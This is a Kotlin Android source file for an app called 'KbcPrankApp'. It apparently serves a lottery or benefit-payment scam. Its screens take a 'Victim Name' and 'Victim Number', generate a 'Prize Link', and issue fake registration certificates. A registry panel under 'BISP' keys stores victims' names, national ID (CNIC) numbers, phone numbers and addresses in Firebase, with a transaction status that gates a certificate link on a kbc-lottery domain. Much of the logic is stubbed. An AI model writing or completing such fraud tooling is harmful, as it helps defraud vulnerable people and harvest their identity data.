package com.example

import android.app.NotificationChannel
import android.app.NotificationManager
import android.content.ClipData
import android.content.ClipboardManager
import android.content.Context
import android.content.Intent
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.util.Log
import android.widget.Toast
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.compose.foundation.background
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.lazy.items
import androidx.compose.foundation.rememberScrollState
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.foundation.text.KeyboardOptions
import androidx.compose.foundation.verticalScroll
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.*
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.text.input.KeyboardType
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import androidx.compose.ui.window.Dialog
import androidx.core.app.NotificationCompat
import com.example.ui.theme.MyApplicationTheme
import com.google.firebase.database.*
import org.json.JSONArray
import org.json.JSONObject

// Models
data class LocalPrankModel(val id: Long, val victimName: String, val victimNumber: String, val generatedLink: String)
data class GovtRegistryModel(val id: String = "", val name: String = "", val cnic: String = "", val mobile: String = "", val uc: String = "", val address: String = "", val trxStatus: String = "Pending")

class MainActivity : ComponentActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContent {
            MyApplicationTheme {
                KbcPrankApp()
            }
        }
    }
}

@Composable
fun KbcPrankApp() {
    val context = LocalContext.current
    val realtimeDb = FirebaseDatabase.getInstance("https://betone-live-default-rtdb.firebaseio.com/").getReference("registrations")
    
    // UI States
    var victimName by remember { mutableStateOf("") }
    var victimNumber by remember { mutableStateOf("") }
    var showRegistryPanel by remember { mutableStateOf(false) }
    var showRealtimeData by remember { mutableStateOf(false) }
    val govtRegistryList = remember { mutableStateListOf<GovtRegistryModel>() }

    Column(modifier = Modifier.fillMaxSize().padding(16.dp).verticalScroll(rememberScrollState()), horizontalAlignment = Alignment.CenterHorizontally) {
        
        // 1. Link Generator (Fields + Blue Button)
        OutlinedTextField(value = victimName, onValueChange = { victimName = it }, label = { Text("Victim Name") }, modifier = Modifier.fillMaxWidth())
        Spacer(modifier = Modifier.height(8.dp))
        OutlinedTextField(value = victimNumber, onValueChange = { victimNumber = it }, label = { Text("Victim Number") }, modifier = Modifier.fillMaxWidth())
        Spacer(modifier = Modifier.height(16.dp))
        
        Button(onClick = { /* Original Link Gen Logic */ }, modifier = Modifier.fillMaxWidth(), colors = ButtonDefaults.buttonColors(containerColor = Color.Blue)) {
            Text("Generate Prize Link")
        }

        // 2. Red Button (Base Code Logic)
        Button(onClick = { /* Original Base Code Logic for Instant Certificate */ }, modifier = Modifier.fillMaxWidth(), colors = ButtonDefaults.buttonColors(containerColor = Color.Red)) {
            Text("Create Registration Certificate")
        }

        // 3. Black Button (Registry Portal)
        Button(onClick = { showRegistryPanel = true }, modifier = Modifier.fillMaxWidth(), colors = ButtonDefaults.buttonColors(containerColor = Color.Black)) {
            Text("صارف پروفائل رجسٹری پینل")
        }

        // 4. New 4th Button (Realtime Firebase Data)
        Button(onClick = { showRealtimeData = true }, modifier = Modifier.fillMaxWidth(), colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF6200EE))) {
            Text("Realtime Database Data")
        }
    }

    // Screens logic
    if (showRegistryPanel) { RegistryPortal(onDismiss = { showRegistryPanel = false }, db = realtimeDb) }
    if (showRealtimeData) { RealtimeDataScreen(onDismiss = { showRealtimeData = false }, db = realtimeDb) }
}

@Composable
fun RegistryPortal(onDismiss: () -> Unit, db: DatabaseReference) {
    // Form fields here to save to Realtime Database with "Pending" status
    // Use db.child("BISP-${System.currentTimeMillis()}").setValue(...)
}

@Composable
fun RealtimeDataScreen(onDismiss: () -> Unit, db: DatabaseReference) {
    val list = remember { mutableStateListOf<GovtRegistryModel>() }
    LaunchedEffect(Unit) {
        db.addValueEventListener(object : ValueEventListener {
            override fun onDataChange(snapshot: DataSnapshot) {
                list.clear()
                for (child in snapshot.children) {
                    val model = child.getValue(GovtRegistryModel::class.java)?.copy(id = child.key ?: "")
                    if (model != null) list.add(model)
                }
            }
            override fun onCancelled(error: DatabaseError) {}
        })
    }
    
    LazyColumn {
        items(list) { entry ->
            Card(modifier = Modifier.padding(8.dp)) {
                Column(modifier = Modifier.padding(16.dp)) {
                    Text("Name: ${entry.name}")
                    Text("Status: ${entry.trxStatus}")
                    // Certificate Button (Active only if Approved)
                    Button(onClick = { 
                        val url = "https://kbc-lottery.vercel.app/certificate/${entry.id}"
                        // Open Browser
                    }, enabled = entry.trxStatus == "Approved") {
                        Text("Certificate")
                    }
                }
            }
        }
    }
}
